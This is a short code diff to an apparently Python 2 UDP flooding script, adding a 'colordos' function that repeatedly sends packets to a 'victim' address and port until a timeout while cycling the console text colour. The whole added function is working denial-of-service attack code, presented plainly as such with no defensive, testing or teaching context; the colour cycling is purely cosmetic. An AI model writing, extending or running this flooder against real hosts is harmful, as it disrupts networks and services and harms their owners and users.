@@ -36,3 +36,26 @@ while 1:
 		pass
 	sent = sent + 5
 	print "%s Packets: %s Port: %s "%(sent, victim, vport)
+
+def colordos():
+	while 1:
+		if time.time() > timeout:
+			break		
+		else:
+			pass
+		try:
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+		except:
+			pass
+		global sent
+		sent = sent + 5
+		global hue
+		r, g, b = hsv_to_rgb(hue, 1.0, 0.8)
+		console.set_color(r, g, b)
+		hue += 0.001
+		print "%s Packets: %s Port: %s " %(sent, victim, vport)
+console.set_color()
